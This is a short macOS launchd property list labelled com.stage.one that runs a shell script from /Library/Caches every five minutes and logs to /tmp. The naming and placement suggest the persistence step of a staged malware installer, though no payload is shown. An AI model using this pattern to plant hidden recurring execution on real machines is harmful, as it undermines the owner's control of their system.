# com.stage.one.plist
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">

<plist version="1.0">

<dict>

    <key>Label</key>

    <string>com.stage.one</string>

    <key>ProgramArguments</key>

    <array>

        <string>/bin/sh</string>

        <string>/Library/Caches/stage1.sh</string>

    </array>

    <key>StartInterval</key>

    <integer>300</integer>
    
     <key>StandardErrorPath</key>
        <string>/tmp/StageOne.err</string>

        <key>StandardOutPath</key>
        <string>/tmp/StageOne.out</string>

</dict>

</plist>
